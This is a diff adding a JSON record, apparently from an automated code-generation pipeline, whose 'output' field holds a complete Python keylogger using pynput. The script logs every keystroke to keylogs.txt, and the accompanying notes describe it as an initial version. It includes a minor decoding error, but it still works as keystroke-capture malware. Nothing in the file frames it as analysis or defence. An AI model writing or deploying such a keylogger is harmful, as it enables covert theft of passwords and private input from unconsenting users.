@@ -1,0 +1,6 @@
+{
+  "output": "from pynput.keyboard import Listener\n\ndef on_press(key):\n\ttry:\n\t\tlog = f\"{key.char.decode('utf-8') if hasattr(key, 'char') else str(key)}\"\n\texcept AttributeError:\n\t\tlog = str(key)\n\twith open(\"keylogs.txt\", \"a\") as f:\n\t\tf.write(log + \"\\n\")\n\tprint(log)\n\nwith Listener(on_press=on_press) as listener:\n\tlistener.join()",
+  "notes": "Initial creation of the script to capture keystrokes and write them to keylogs.txt. Includes print statements for debugging.",
+  "applied_fixes": [],
+  "iterations": 1
+}
